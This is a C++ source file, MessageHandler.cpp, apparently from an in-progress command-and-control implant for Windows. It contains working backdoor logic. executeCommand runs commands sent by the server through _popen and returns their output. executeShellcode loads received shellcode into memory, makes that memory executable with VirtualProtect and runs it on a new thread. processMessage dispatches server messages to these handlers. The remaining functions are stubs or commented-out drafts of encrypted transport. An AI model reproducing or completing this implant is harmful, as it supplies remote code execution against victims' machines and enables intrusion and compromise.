/* MessageHandler.cpp */

#include "C2Profile.h"
#include "MessageHandler.h"
#include "MessageTypes.h"
#include "MessagePublisher.h"
#include "Recon.h"
#include "TransportLayer.h"

#include <iostream>

#include <cstdlib> // NOTE: needed to execute shell cmd





MessageHandler::MessageHandler()
	: transportLayer_(nullptr)
{
	// debug statement
}

MessageHandler::~MessageHandler()
{
	// debug statement
}

bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
{
	std::cout << "=== EXECUTE COMMAND START ===" << std::endl;
	std::cout << "executeCommand: " << byte2string(data).c_str() << std::endl;


	// TODO: instead add result into the queue, and have transporter send them all when ready?
	// TODO: if the original (identified by the messageId) incoming internalMessage was marked as high priority, 
	//		 then skip the queue and send the message immediately 

	std::cout << "transportLayer_ pointer: " << transportLayer_ << std::endl;
	if (!transportLayer_)
	{
		std::cout << "ERROR: transportLayer_ is NULL!" << std::endl;
		return false;
	}


	std::string command = byte2string(data).c_str();
	std::string result;

	// EASIEST METHOD - just use _popen directly
	FILE* pipe = _popen(command.c_str(), "r");
	if (!pipe)
	{
		result = "ERROR: Failed to execute command";
	}
	else
	{
		char buffer[128];
		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
		{
			result += buffer;
		}
		_pclose(pipe);
	}

	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
	std::cout << result << std::endl;

	// TODO: props should make a separate function for InternalMessage generation
	InternalMessage outMsg;
	outMsg.data = string2byte(result);
	std::cout << "outMsg.data size: " << outMsg.data.size() << std::endl;
	std::cout << "outMsg.data valid: " << !outMsg.data.empty() << std::endl;

	MessageHeader header;
	header.messageType = MessageType::COMMAND_RESULT;
	header.messageId = 105; // TODO: 
	header.dataSize = outMsg.data.size();
	outMsg.header = header;

	bool sendResult = transportLayer_->sendMessage(outMsg);
	return sendResult;
}

bool MessageHandler::executeShellcode(InternalMessage& msg)
{
	std::cout << "executeShellcode" << std::endl;
    LPVOID shellMem = VirtualAlloc(0, msg.header.dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellMem) // TODO: checking if it is NULL would be more correct?
	{
        // DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
		return false;
    }

    // memcpy(beacon_mem, shellcode, bytes_received);
	// TODO: copy 8 bytes at a time, and then copy left over
	for (unsigned int i = 0; i < msg.header.dataSize; ++i) 
	{
		((char *)shellMem)[i] = msg.data[i];
	}

    // EXECUTE_READ.
    DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
    // NOTE: virtualProtect is also being called somewhere in the windows api
    if (VirtualProtect(shellMem, msg.header.dataSize, PAGE_EXECUTE_READ, &old_prot) == FALSE) 
    {
        // Fail silently if we cannot make the memory executable.
        return false;
    }

    // DEBUG_PRINT("6 - Memory allocated and copied");

    // 4.
    //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellMem, NULL, 0, NULL);
    if (!thread) 
	{
        // DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
        return false;
    }

    // DEBUG_PRINT("7 - Thread created, waiting..."); 
    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete

	return true;
}


bool MessageHandler::downloadFile(std::vector<uint8_t>& data)
{
	std::cout << "downloadFile" << std::endl;
	return false;
}

bool MessageHandler::uploadFile(std::vector<uint8_t>& data)
{
	std::cout << "uploadFile" << std::endl;
	return false;
}

bool MessageHandler::updateConfig(std::vector<uint8_t>& data)
{
	std::cout << "updateConfig" << std::endl;
	return false;
}

bool MessageHandler::handleServerError(std::vector<uint8_t>& data)
{
	std::cout << "handleServerError" << std::endl;
	return false;
}

// TODO: something about this function corruprts the memory
void MessageHandler::processMessage(InternalMessage& msg)
{
	switch (msg.header.messageType)
	{
	case MessageType::EXECUTE_COMMAND:
		executeCommand(msg.data);
		break;
	
	case MessageType::EXECUTE_SHELL_CODE:
		executeShellcode(msg);
		//executeShellcode(msg.data);
		break;

	case MessageType::UPLOAD_FILE:
		uploadFile(msg.data);
		break;

	case MessageType::DOWNLOAD_FILE:
		downloadFile(msg.data);
		break;

	case MessageType::CONFIG_UPDATE:
		updateConfig(msg.data);
		break;

	case MessageType::ERROR_REPORT:
		// Server sent an error, handle it
		handleServerError(msg.data);
		break;
	default:
		std::cout << "default case, MessageType = " << msg.header.messageType << std::endl;
	}
}


void MessageHandler::sendQueuedMessages()
{
	std::cout << "sendQueuedMessages... not implemented" << std::endl;
}

void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
{
	transportLayer_ = &transportLayer;
}

std::vector<uint8_t> MessageHandler::string2byte(std::string& inMsg)
{
	return std::vector<uint8_t>(inMsg.begin(), inMsg.end());
}

std::string MessageHandler::byte2string(std::vector<uint8_t>& inMsg)
{
	return std::string(inMsg.begin(), inMsg.end());
}


// this function processes the header of the message
// to determine how to interpet the contents/data of 
// the message. 
//int processMessage(BYTE* payload, MessageHeader* header)
// int processIncomingMessage(InternalMessage* msg, Config* config)
/*
bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
{
	return true;

	switch (msg->header.messageType) {
		case SYS_INFO:
		{
			ReconMessage reconMessage;
			int status = generateReconMessage(&reconMessage);

			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
			InternalMessage* response = (InternalMessage *)malloc(sizeof(InternalMessage));
			memcpy(response->data, &reconMessage, sizeof(ReconMessage));
			response->header.dataSize = sizeof(ReconMessage);
			//return send(msg->header.message_id);
			//status |= send(response, config);
			return status;
		}

		//case MSG_TYPE_SHELLCODE:
			//return ExecuteShellcode(payload, header->payload_size);

		//case MSG_TYPE_CMD:
			//return ExecuteCommand((char*)payload, header->payload_size);

		// ... other cases
	}
	return false;
}
*/


//int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
//bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received, Config& config)
/*
bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
{
	// TODO: replace 'true' with a condition
	while (true) // TODO: change to var... while tcp connection is valid/established/successful
	{
		// TODO: socket stuff

		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
		// if there's incoming commands...

		// TODO: should probs def move this pRecv logic somewhere else maybe in MessageConsumer? 
		// so thorough validiating and error checks can be done on the data. stuff like making sure message isn't empty
		// and is a valid MessageType and what not
		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);

        InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
		//handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
		//handleTCP(buffer, bytes_received, &resultMsg); // maybe rename to handleTCPInbound or handleConnection once polymorphic?

		//publisher
        //send(&resultMsg, config); // TODO: check return value for errors
		//sendMessage(&resultMsg); // TODO: check return value for errors



        // if heartbeat interval elapsed... 
        // sendMessage(MessageType HEARTBEAT) // TODO: this should be the first thing checked? heartbeat timer should be reset anytime a message is received?

		// sleepWithJitter()

		// if connection is lost, attempt to reconnect... maybe do this logic somewhere else?
	}

	return false; // if no errors, return 0
}*/

//bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, C2Profile* config)
/*
bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg)
{
	// Raw Bytes from Socket
	uint8_t buf[4096]; // TODO: rename to plaintext?

	// DECRYPT -> Decrypted Bytes
	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
	// TODO: this parsing of data should be done in actual decrypt method? or a wrapper for it maybe 
	const uint8_t* iv = rawData;
	const uint8_t* ciphertext = rawData + 12;
	size_t ciphertext_len = rawDataLength - 12 - 16;
	const uint8_t* tag = rawData + 12 + ciphertext_len;
	//int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size

	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
	// parseHeader()
	// check if sizeof(MessageHeader) + header->payloadSize == decrypted_size, otherwise throw error

	// DESERIALIZE -> InternalMessage 
	// check length(plaintext) == sizeof(InternalMessage)
    // const InternalMessage* msg = (const InternalMessage*)plaintext;
	// VALIDATE
    // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
    // check length(plaintext) == expected_size

	InternalMessage* msg = (InternalMessage*)buf;

	// EXECUTE (InternalMessage)
	// call function based on InternalMessage
	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
	//processMessage(msg, config);
	processMessage(msg);

	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
	//InternalMessage* response = malloc(sizeof(InternalMessage));
	//memcpy(response->payload, &recon, sizeof(ReconData));
	//response->header.payload_size = sizeof(ReconData);

	// TODO: cleanup/free buf
	return true;
}*/
/*
int handleHTTPS(uint8_t* data)
{
	// HTTPS Text Message

	// PARSE HTTP HEADERS

	// EXTRACT JSON BODY

	// EXTRACT BASE64 FIELD

	// BASE64 DECODE -> Raw Bytes

	// DECRYPT -> Decrypted Bytes

	// DESERIALIZE -> InternalMessage

	// VALIDATE

	// EXECUTE (InternalMessage)

}*/


///////////////////////


/*
MessageHandler::MessageHandler(
            CompressorUniquePtr compressorPtr,
            EncrypterUniquePtr encrypterPtr,
            EncoderUniquePtr encoderPtr,
            SerializerUniquePtr serializerPtr,
            Config* config) :
          	compressorPtr_(compressorPtr),
            encrypterPtr_(encrypterPtr),
            encoderPtr_(encoderPtr),
            serializerPtr_(serializerPtr),
            config_(config)
{}*/
//MessageHandler::MessageHandler(C2Profile& config) {}

/*
bool MessageHandler::sendMessage() // overload this function?
{
	// TODO: where does parsing go in this? (if it's even needed)

	// InternalMessage
	// Validate
	// Serialize
	// Encode
	// Compress
	// Encrypt
	// Frame (if needed)
	// Raw Bytes
	// Send
	return false;
}

// TODO: setup a listener function that calls this function?
// listener function simply calls recv and handles socket stuff?
// recvMessage would just serve as a wrapper for that maybe?
bool MessageHandler::recvMessage() // overload this function?
{
	// TODO: where does parsing go in this? (if it's even needed)

	// Recv
	// Raw Bytes
	// Decrypt
	// Decompress
	// Decode
	// Deserialize
	// Obtain InternalMessage object
	// Validate
	// handle InternalMessage (based on its header)
	return false;
}
*/
